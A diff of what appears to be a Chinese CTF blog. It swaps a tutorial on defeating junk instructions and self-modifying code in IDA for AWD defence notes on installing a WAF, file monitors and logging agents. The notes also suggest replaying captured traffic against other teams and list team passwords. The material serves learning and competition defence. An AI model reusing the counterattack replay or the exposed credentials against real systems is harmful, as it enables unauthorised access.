-<p>到此，<code>main()</code>就搞出来了，<code>F5</code>就能看到伪代码</p>
-<p><img src="/./assets/QQ%E6%88%AA%E5%9B%BE20230115193142.jpg"></p>
-<p>到这里就完成了四分之一了。继续加油</p>
-<p>通过这个条状带可以看到，还有一段代码被ida识别错了，所以我们要继续修改</p>
-<p>仔细看一下，标红的这段代码，逻辑是没有什么问题的，但是最后没有看到<code>retn</code></p>
-<p><img src="/./assets/QQ%E6%88%AA%E5%9B%BE20230115194135.jpg"></p>
-<p>所以这构不成一个函数，所以就要考虑这段代码之前和之后的函数是不是被<code>ida</code>识别错了，将原本的一个函数识别成多段了。我们先往前找，找到上一个<code>retn</code></p>
-<p><img src="/./assets/QQ%E6%88%AA%E5%9B%BE20230115194958.jpg"></p>
-<p>找到上面的<code>retn</code>但是由于retn前有数据，将数据转成代码后<code>retn</code>会消失，所以上上面一整个函数都是识别错误的。我们选定函数的首行，然后按<code>U键</code>就能取消这个函数的识别。</p>
-<p><img src="/./assets/QQ%E6%88%AA%E5%9B%BE20230115195329.jpg"></p>
-<p>之后发现函数不见了，代码变成了数据，我们要接着将数据变成代码(<code>C键</code>)(将之后所有的数据都改成代码)</p>
-<p>之后继续查看逻辑的错误，发现</p>
-<p><img src="/./assets/QQ%E6%88%AA%E5%9B%BE20230115195701.jpg"></p>
-<p>这里逻辑和上面是一样的，所以不过多说，置为<code>NOP</code></p>
-<p>接着到函数的找到函数的行首，<code>P键</code>将其识别为函数</p>
-<p>然后F5进入伪代码页面</p>
-<p><img src="/./assets/QQ%E6%88%AA%E5%9B%BE20230115202922.jpg"></p>
-<p>点击函数名，按<code>X键</code>，查看交叉引用，返回到<code>main()</code>中，</p>
-<p><img src="/./assets/QQ%E6%88%AA%E5%9B%BE20230115203121.jpg"></p>
-<p>之后根据伪代码，很简单就能得到相应的flag（会用到一点Crypto中的知识），这里主要说的是花指令，所以就不往下做了。</p>
-<p>总结一下，</p>
-<ul>
-<li><p>汇编中的函数必须由<code>retn</code>结尾</p>
-</li>
-<li><p>函数开始时一般有这种标志</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CC CC CC CC CC CC CC CC CC CC+ align 10h</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>很典型的一段花指令</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">loc_4014D7:</span><br><span class="line">mov     [ebp-0DCh], eax</span><br><span class="line">call    sub_4018C0</span><br><span class="line">mov     [ebp-0E0h], eax</span><br><span class="line">call    near ptr loc_4014EF+4</span><br><span class="line">jmp     short near ptr loc_4014D7+1</span><br><span class="line">;-----------------------------------------</span><br><span class="line">loc_4014EF:</span><br><span class="line">add     eax, 83000000h</span><br><span class="line">......</span><br></pre></td></tr></table></figure></li>
-</ul>
-<h3 id="SMC"><a href="#SMC" class="headerlink" title="SMC"></a>SMC</h3><blockquote>
-<p>SMC(self-Modifying  Code 自修改代码)，就是在真正执行某一段代码时，程序会对自身的该段代码进行自修改，只有在修改后的代码才是可汇编、可执行的。在程序未对该段代码进行修改之前，在静态分析状态下，均是不可读的字节码，IDA之类的反汇编器无法识别程序的正常逻辑</p>
-</blockquote>
-<p>这个概念一下也不好理解，我们来一道题(<strong>Deliver_TEA_to_dalao</strong>)</p>
-<p>用ida打开后发现一切正常，F5反编译出的也没什么问题</p>
-<p><img src="/./assets/QQ%E6%88%AA%E5%9B%BE20230116120415.jpg"></p>
-<p><img src="/./assets/QQ%E6%88%AA%E5%9B%BE20230116120503.jpg"></p>
-<p>可以看到关键代码是这个<code>encrypt_0v0()</code>,我们点进去看一下这个函数的内部(<code>双击</code>函数名)</p>
-<p><img src="/./assets/QQ%E6%88%AA%E5%9B%BE20230116121058.jpg"></p>
-<p>看不懂，说明这就不是一个正确的函数。</p>
-<p>转到<code>main()</code>再看看</p>
-<p><img src="/./assets/QQ%E6%88%AA%E5%9B%BE20230116121434.jpg"></p>
-<p>有一个<code>ignoreME()</code>对<code>encrypt_0v0()</code>进行了一些处理，进入内部看一下</p>
-<p><img src="/./assets/QQ%E6%88%AA%E5%9B%BE20230116121503.jpg"></p>
-<p>反编译出的逻辑有一点问题，我们修改一下函数返回值和参数类型，就能得到正确的函数</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __cdecl <span class="title function_">ignoreMe</span><span class="params">(<span class="type">char</span> *a1, <span class="type">int</span> a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [esp+Ch] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; a2; ++i )</span><br><span class="line">    a1[i] ^= <span class="number">0x56</span>u;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p><code>a1</code>是传入的<code>encrypt_0v0()</code>，所以<code>ignoreMe()</code>，对<code>encrypt_0v0()</code>的地址进行了异或操作。异或之后的地址才是<code>encrypt_0v0()</code>的真是地址。</p>
-<p>所以SCM的逻辑是这样的</p>
+<p>有一个很有用的waf叫<code>warchbird</code>，我们不使用他的waf功能，只是借助<code>watchbird</code>来进行流量分析</p>
 <ol>
-<li><strong>程序在最开始的时候就修改一些代码片段的地址，让其指向错误的地方，这样反编译就会失败，代码片段不能正常执行。</strong></li>
-<li><strong>程序中还有一段能将上面的错误地址修改过来的代码，在程序运行的时候这段代码就会执行，将地址修改过来，码片段能正常执行。</strong></li>
+<li><p>将watchbird中的<code>waf.so</code>和<code>watchbird.php</code>文件都传到html目录下面</p>
+</li>
+<li><p>给两个文件777权限</p>
+</li>
+<li><p>在目录下面执行</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php watchbird.php --install /var/www/html</span><br></pre></td></tr></table></figure>
+
+<p>这时，所有php文件都会包含<code>watchbird</code></p>
+</li>
+<li><p>登录<code>watchbird</code></p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?watchbird=ui</span><br></pre></td></tr></table></figure>
+
+<p>登录之后要设置密码，<strong>密码不要设置弱口令，一定要加几个符号</strong></p>
+<p>设置之后再登录就好</p>
+</li>
+<li><p>关闭<code>watchbird</code>里面的waf</p>
+<p>不关指定没好果汁吃</p>
+</li>
 </ol>
-<p>按照这个逻辑我们能发现，让程序运行完修改地址的函数之后，再反编译，就能得到想要的代码片段。这种方法就叫做<strong>动态调试</strong></p>
-<p>还有一种方法，既然函数可以自己修改，那我们手动也可以修改。但是手动一个一个修改的太慢了，所以要用到脚本。这种方法叫<strong>静态修改</strong></p>
-<h4 id="动调法"><a href="#动调法" class="headerlink" title="动调法"></a>动调法</h4><p>回到这个题目，在函数得到正确的地址后打个断点，方便查看</p>
-<p><img src="/./assets/QQ%E6%88%AA%E5%9B%BE20230116124830.jpg"></p>
-<p>然后再调试界面选择<code>Local Windows debugger</code>,然后开始调试</p>
-<p><img src="/./assets/QQ%E6%88%AA%E5%9B%BE20230116125045.jpg"></p>
-<p>进去后不管那么多，直接搜索我们要找的函数</p>
-<p><img src="/./assets/QQ%E6%88%AA%E5%9B%BE20230116134748.jpg"></p>
-<p>找到之后发现,代码被识别成了数据</p>
-<p><img src="/./assets/QQ%E6%88%AA%E5%9B%BE20230116134906.jpg"></p>
-<p>接下来就要找到这个函数的边界，也就是找到<code>retn</code>，然后将数据转成代码，再将代码识别为函数就可以了。</p>
-<p>改完长这样</p>
-<p><img src="/./assets/QQ%E6%88%AA%E5%9B%BE20230116135543.jpg"></p>
-<p>然后<code>F5</code></p>
-<p><img src="/./assets/QQ%E6%88%AA%E5%9B%BE20230116135729.jpg"></p>
-<p>可以看到函数的返回值有点问题，应该是<code>void</code>，我们改一下</p>
-<p><img src="/./assets/QQ%E6%88%AA%E5%9B%BE20230116135844.jpg"></p>
-<p>这样就完全搞出来。这时我们停止调试，也可以正常查看了。</p>
-<p><img src="/./assets/QQ%E6%88%AA%E5%9B%BE20230116140014.jpg"></p>
-<p>接下来就是Crypto问题了，这里不再多说。</p>
-<h4 id="静态修改"><a href="#静态修改" class="headerlink" title="静态修改"></a>静态修改</h4><p>上面简单讲过原理，这里不再多说，直接给出脚本</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;idc.idc&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="title function_">xor_setp1</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">auto</span> addr = <span class="number">0x00401448</span>;   <span class="comment">//这里填入要解密字节串的起始地址</span></span><br><span class="line">    <span class="keyword">auto</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;addr+i&lt;=<span class="number">0x00401504</span>;i++)   <span class="comment">//循环结束的条件为字节串的结束地址</span></span><br><span class="line">    &#123;</span><br><span class="line">        PatchByte(addr+i,Byte(addr+i)^<span class="number">0x56</span>);   <span class="comment">//异或的数字根据情况修改</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">static</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">        xor_setp1();</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p><img src="https://gaoxudong.top/wp-content/uploads/2023/04/QQ%E6%88%AA%E5%9B%BE20230411174327.jpg" alt="QQ截图20230411174327"></p>
+<p>然后再日志里面就可以看流量了</p>
+<p><img src="https://gaoxudong.top/wp-content/uploads/2023/04/QQ%E6%88%AA%E5%9B%BE20230411174556.jpg" alt="QQ截图20230411174556"></p>
+<p>流量重放很好用，可以根据别人的方法来反打</p>
+<p><strong>这里流量日志没有过滤ip的选项，所以结合weblogger使用</strong></p>
+<h3 id="上传文件监控"><a href="#上传文件监控" class="headerlink" title="上传文件监控"></a>上传文件监控</h3><p>在上面都做完后，审出来的洞都修复以后，再上文件监控</p>
+<p>文件监控会自动识别并恢复被删除的文件或者删除新上传的文件</p>
+<ol>
+<li><p>上传文件到html目录下面</p>
+</li>
+<li><p>给777权限</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">chmod</span> u+x jiankong</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>执行脚本</p>
+<p><strong>在执行文件监控的时候建议再开一个ssh窗口，因为该进程会一直占用shell</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./jiankong</span><br></pre></td></tr></table></figure>
 
-<p>还有一个python脚本，原理都一样</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">patch</span>(<span class="params">start,end,key</span>):</span><br><span class="line">    n=<span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span>(start+n!=end+<span class="number">1</span>):</span><br><span class="line">        addr=start+n</span><br><span class="line">        PatchByte(addr,Byte(addr)^key)</span><br><span class="line">        n+=<span class="number">1</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;%d Byte has been changed&quot;</span>%n)</span><br><span class="line"></span><br><span class="line">codeStart=<span class="number">0x401448</span> 	<span class="comment">#要解密字节串的起始地址</span></span><br><span class="line">codeLen=<span class="number">189</span>			<span class="comment">#解密的长度</span></span><br><span class="line">xorData=<span class="number">0x56</span>		<span class="comment">#异或的数值</span></span><br><span class="line">patch(codeStart,codeStart+codeLen-<span class="number">1</span>,xorData)</span><br></pre></td></tr></table></figure>
+<p><img src="https://gaoxudong.top/wp-content/uploads/2023/04/QQ%E6%88%AA%E5%9B%BE20230411181102.jpg" alt="QQ截图20230411181102"></p>
+<p>监控位置一般是&#x2F;var&#x2F;www&#x2F;html</p>
+<p>备份位置选择&#x2F;tmp</p>
+</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">chmod</span> +x guardian.phar</span><br><span class="line"><span class="built_in">chmod</span> +x tapeworm.phar</span><br><span class="line"><span class="built_in">chmod</span> +x roundworm</span><br><span class="line"></span><br><span class="line">./guardian.phar -i /var/www/html -s 10.211.55.3:8023</span><br><span class="line">./tapeworm.phar -d /var/www/html -s 10.211.55.3:8023</span><br><span class="line">./roundworm  -w /var/www/html -s 10.211.55.3 -p 8023 -d</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
-<p>对不同的题，脚本要进行相应的修改</p>
-<p>我们换一道题进行演示(校赛findit)</p>
-<p>多余的不多说，这里分析代码</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v4[<span class="number">40</span>]; <span class="comment">// [esp+18h] [ebp-28h] BYREF</span></span><br><span class="line"></span><br><span class="line">  __main();</span><br><span class="line">  we = ssd;</span><br><span class="line">  <span class="built_in">printf</span>(&amp;Format);</span><br><span class="line">  N1(v4);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> __cdecl <span class="title function_">N1</span><span class="params">(<span class="type">char</span> *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  jiake(we, <span class="number">738</span>, <span class="number">5</span>);</span><br><span class="line">  <span class="keyword">return</span> ((<span class="type">int</span> (__cdecl *)(<span class="type">char</span> *))we)(a1);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">bool</span> __cdecl <span class="title function_">jiake</span><span class="params">(<span class="type">char</span> *lpAddress, <span class="type">int</span> a2, <span class="type">char</span> a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">MEMORY_BASIC_INFORMATION</span> <span class="title">Buffer</span>;</span> <span class="comment">// [esp+18h] [ebp-30h] BYREF</span></span><br><span class="line">  DWORD flOldProtect[<span class="number">4</span>]; <span class="comment">// [esp+34h] [ebp-14h] BYREF</span></span><br><span class="line"></span><br><span class="line">  VirtualQuery(lpAddress, &amp;Buffer, <span class="number">0x1C</span>u);</span><br><span class="line">  flOldProtect[<span class="number">2</span>] = VirtualProtect(Buffer.BaseAddress, Buffer.RegionSize, <span class="number">0x40</span>u, &amp;Buffer.Protect);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 = a2--;</span><br><span class="line">    flOldProtect[<span class="number">1</span>] = v3;</span><br><span class="line">    <span class="keyword">if</span> ( !v3 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    *lpAddress++ ^= a3;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> VirtualProtect(Buffer.BaseAddress, Buffer.RegionSize, Buffer.Protect, flOldProtect);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>这里可以看出来，<code>N1()</code>这个函数就是对地址进行修改的。而且进行修改的函数就是<code>jiake()</code>这个函数。修改的的<code>we</code>的地址，而<code>we</code>的值就是<code>ssd</code>传过去的，所以 最终修改的<code>ssd</code>的地址，我们接下来要找到<code>ssd</code>的首地址。</p>
-<p>选定<code>ssd</code>后按<code>TAB</code></p>
-<p><img src="/./assets/QQ%E6%88%AA%E5%9B%BE20230116143004.jpg"></p>
-<p>跳转到这个界面</p>
-<p><img src="/./assets/QQ%E6%88%AA%E5%9B%BE20230116143127.jpg"></p>
-<p>选定后<code>双击</code></p>
-<p><img src="/./assets/QQ%E6%88%AA%E5%9B%BE20230116143141.jpg"></p>
-<p>找到函数首地址<code>0x401500</code></p>
-<p>根据<code>jiake()</code>得到异或的值是<code>0x5</code>，长度是<code>738</code>也就是<code>0x2E2</code></p>
-<p>修改一下脚本</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">patch</span>(<span class="params">start,end,key</span>):</span><br><span class="line">    n=<span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span>(start+n!=end+<span class="number">1</span>):</span><br><span class="line">        addr=start+n</span><br><span class="line">        PatchByte(addr,Byte(addr)^key)</span><br><span class="line">        n+=<span class="number">1</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;%d Byte has been changed&quot;</span>%n)</span><br><span class="line"></span><br><span class="line">codeStart=<span class="number">0x401500</span> 	<span class="comment">#要解密字节串的起始地址</span></span><br><span class="line">codeLen=<span class="number">738</span>			<span class="comment">#解密的长度</span></span><br><span class="line">xorData=<span class="number">0x5</span>			<span class="comment">#异或的数值</span></span><br><span class="line">patch(codeStart,codeStart+codeLen-<span class="number">1</span>,xorData)</span><br></pre></td></tr></table></figure>
-
-<p>保存为文件，然后<code>File&gt;&gt;Script File&gt;&gt;选择文件</code></p>
-<p><img src="/./assets/QQ%E6%88%AA%E5%9B%BE20230116144822.jpg"></p>
-<p>执行完后是这样，稍微再修一下，修好之后直接<code>F5</code>得到<code>ssd()</code></p>
-<p><img src="/./assets/QQ%E6%88%AA%E5%9B%BE20230116145048.jpg"></p>
-<p>接下来不多说了。</p>
+<h1 id="密码"><a href="#密码" class="headerlink" title="密码"></a>密码</h1><ol>
+<li><p>上weblogger</p>
+<p>高旭东负责，密码：<code>b565769ffbfe776234873fa18cc8b8a2</code></p>
+</li>
+<li><p>上watchbird</p>
+<p>高旭东负责，密码：<code>b565769ffbfe776234873fa18cc8b8a2</code></p>
+</li>
+</ol>
 
       
     </div>
@@ -1207,138 +412,6 @@
 
 
   
-    <article id="post-python在ctf中的部分应用" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2023/06/01/python%E5%9C%A8ctf%E4%B8%AD%E7%9A%84%E9%83%A8%E5%88%86%E5%BA%94%E7%94%A8/" class="article-date">
-  	<time datetime="2023-06-01T03:08:58.221Z" itemprop="datePublished">2023-06-01</time>
-</a>
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h2 id="对图片的处理"><a href="#对图片的处理" class="headerlink" title="对图片的处理"></a>对图片的处理</h2><h3 id="tqdm库"><a href="#tqdm库" class="headerlink" title="tqdm库"></a>tqdm库</h3><p>tqdm库是用来给程序加一个进度条<br><img src="https://gaoxudong.top/wp-content/uploads/2022/10/2022-10-13-22-37-20.png"></p>
-<h4 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> tqdm</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> tqdm(<span class="built_in">range</span>(<span class="number">1</span>,<span class="number">10000</span>)):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">50000</span>):</span><br><span class="line">        <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> tqdm([<span class="string">&#x27;z&#x27;</span>,<span class="string">&#x27;z&#x27;</span>,<span class="string">&#x27;z&#x27;</span>]):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">5000000</span>):</span><br><span class="line">        <span class="number">1</span></span><br></pre></td></tr></table></figure>
-<h3 id="struct库"><a href="#struct库" class="headerlink" title="struct库"></a>struct库</h3><p>struct是用来转换数据的</p>
-<blockquote>
-<p>pip install python_struct</p>
-</blockquote>
-<h4 id="用法-1"><a href="#用法-1" class="headerlink" title="用法"></a>用法</h4><blockquote>
-<p>struct.pack(format,data)<br>以format的格式打包后面的data参数，format不指定的话，默认是@(&lt;,&gt;,!,&#x3D;)<br><img src="https://gaoxudong.top/wp-content/uploads/2022/10/2022-10-13-23-18-16.png"><br>struct.unpack(format,data)<br>两个函数是类似的</p>
-</blockquote>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line">b=<span class="number">101159</span></span><br><span class="line">data=struct.pack(<span class="string">&#x27;&lt;i&#x27;</span>,b)</span><br><span class="line"><span class="built_in">print</span>(data)</span><br><span class="line">data=struct.unpack(<span class="string">&#x27;&lt;i&#x27;</span>,data)</span><br><span class="line"><span class="built_in">print</span>(data)</span><br></pre></td></tr></table></figure>
-
-<h3 id="综合"><a href="#综合" class="headerlink" title="综合"></a>综合</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> tqdm</span><br><span class="line"></span><br><span class="line">img = <span class="built_in">open</span>(<span class="string">&quot;flag.png&quot;</span>, <span class="string">&quot;rb&quot;</span>).read()</span><br><span class="line"><span class="keyword">for</span> w <span class="keyword">in</span> tqdm(<span class="built_in">range</span>(<span class="number">10000</span>)):</span><br><span class="line">    <span class="keyword">for</span> h <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10000</span>):</span><br><span class="line">        data = img[<span class="number">0xc</span>:<span class="number">0x10</span>] + struct.pack(<span class="string">&#x27;&gt;i&#x27;</span>, w) + struct.pack(<span class="string">&#x27;&gt;i&#x27;</span>, h) + img[<span class="number">0x18</span>:<span class="number">0x1d</span>]</span><br><span class="line">        crc32 = binascii.crc32(data) &amp; <span class="number">0xffffffff</span></span><br><span class="line">        <span class="keyword">if</span> crc32 == struct.unpack(<span class="string">&#x27;&gt;i&#x27;</span>, img[<span class="number">0x1d</span>:<span class="number">0x21</span>])[<span class="number">0</span>] &amp; <span class="number">0xffffffff</span>:</span><br><span class="line">            <span class="built_in">print</span>(w, h)</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">hex</span>(w), <span class="built_in">hex</span>(h))</span><br><span class="line">            <span class="built_in">open</span>(<span class="string">&quot;new2.png&quot;</span>, <span class="string">&quot;wb&quot;</span>).write(img[:<span class="number">0xc</span>] + data + img[<span class="number">0x1d</span>:])</span><br><span class="line">            exit()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<h3 id="PIL库"><a href="#PIL库" class="headerlink" title="PIL库"></a>PIL库</h3><p>pil库用来简单的图像处理</p>
-<blockquote>
-<p>pip install pillow</p>
-</blockquote>
-<h4 id="用法-2"><a href="#用法-2" class="headerlink" title="用法"></a>用法</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Image.<span class="built_in">open</span>(<span class="string">&#x27;path&#x27;</span>)							<span class="comment">#打开路径中的文件 </span></span><br><span class="line">Image.new(mode,size,color)					<span class="comment">#创建一个新图片 mod是图片的模式RGB什么的，size是图片的尺寸，有长宽两个参数，color设置图片的颜色，不是必须参数</span></span><br><span class="line">Image.save(<span class="string">&#x27;path&#x27;</span>,<span class="built_in">format</span>)					<span class="comment">#保存图片，path是图片的地址与名字，format是保存文件的格式，不是必须参数</span></span><br><span class="line">Image.putpixel((x,y), color)				<span class="comment">#对图片的进行处理，xy是图片的坐标,color是颜色，一般是元组的形式</span></span><br><span class="line">Image.getpixel(x,y)							<span class="comment">#获取像素点值</span></span><br><span class="line">Image.point(function)						<span class="comment">#修改图像的每个像素。</span></span><br></pre></td></tr></table></figure>
-
-<h4 id="举例"><a href="#举例" class="headerlink" title="举例"></a>举例</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line">img = Image.new(<span class="string">&#x27;RGB&#x27;</span>,(<span class="number">500</span>,<span class="number">500</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(img))</span><br><span class="line"><span class="comment"># img.show()</span></span><br><span class="line">img.save(<span class="string">&#x27;test.jpg&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">500</span>):</span><br><span class="line">        img.putpixel((i,i),(<span class="number">255</span>,<span class="number">255</span>,<span class="number">255</span>))</span><br><span class="line">img.save(<span class="string">&#x27;test-after.jpg&#x27;</span>)</span><br></pre></td></tr></table></figure>
-
-<p>kali中也有gnuplot，montage等对图片进行处理的工具</p>
-<h2 id="对文件的处理"><a href="#对文件的处理" class="headerlink" title="对文件的处理"></a>对文件的处理</h2><h3 id="zipfile库"><a href="#zipfile库" class="headerlink" title="zipfile库"></a>zipfile库</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">file = zipfile.Zipfile(<span class="string">&#x27;name&#x27;</span>,mode=<span class="literal">None</span>) 		<span class="comment">#创建一个zip的实例，mode默认为r(读取)，还有w(新建/覆盖)，a(追加)</span></span><br><span class="line">file.namelist() 							 <span class="comment">#获取zip中所有文档的名称</span></span><br><span class="line">ZipFile.infolist()							 <span class="comment">#获取zip包内部的文件的信息</span></span><br><span class="line">	.info.filename					</span><br><span class="line">    .info.is_dir				</span><br><span class="line">    .info.file_size				<span class="comment">#原始大小</span></span><br><span class="line">    .info.compress_size			 <span class="comment">#压缩后大小</span></span><br><span class="line">    .info.CRC</span><br><span class="line">file.extractall(path=<span class="literal">None</span>, members=<span class="literal">None</span>, pwd=<span class="literal">None</span>)	<span class="comment">#解压文件</span></span><br><span class="line">	path是目标地址，默认为当前文件夹</span><br><span class="line">     member是解压包内的指定第n个文件</span><br><span class="line">     